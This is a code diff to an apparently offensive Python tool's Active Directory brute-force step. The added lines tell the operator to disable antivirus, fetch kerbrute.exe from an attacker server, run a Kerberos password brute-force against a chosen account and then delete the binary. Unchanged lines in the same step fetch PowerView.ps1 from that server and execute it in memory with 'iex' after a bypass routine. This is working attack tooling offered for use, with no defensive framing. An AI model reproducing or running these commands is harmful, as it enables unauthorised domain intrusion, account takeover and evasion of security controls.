@@ -285,6 +285,8 @@ def stepSIX_BruteForce():
         print(f"{ok} Skip bruteforce attacks..")
     else:
         print(f"\n{ok} 5-Starting with Bruteforce on a specific username ...\n")
+        print(f"{ok} For this techniques may be necessary disable AV..")
+        x=input(f"{ok} When you finished press ENTER..\n")
         account=input(f"\n{warning} Insert account's name: ")
         bypass=configurazione()
         command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
@@ -293,9 +295,13 @@ def stepSIX_BruteForce():
         value=cleanstring(value)
         value_list=value.split("\n")
         domain=value_list[-1].split(":")[1].rstrip().strip()
-        command=f"{kerbrute} bruteuser -d {domain} {list_password} {account} -v"
+        command1=f"(New-Object Net.WebClient).DownloadFile('http://{IpServer}/kerbrute.exe','C:\\Users\\{username}\\Desktop\\Lelanto\\kerbrute.exe')"
+        value=powershell_commandLine(command1)
+        command=f"kerbrute.exe bruteuser -d {domain} {list_password} {account} -v"
         final_command=f'start cmd.exe @cmd /k "{command}"'
         os.system(final_command)
+        x=input(f"\n{warning} Press ENTER when the process will finish...")
+        os.system("del kerbrute.exe")
         
 
 if __name__=="__main__":
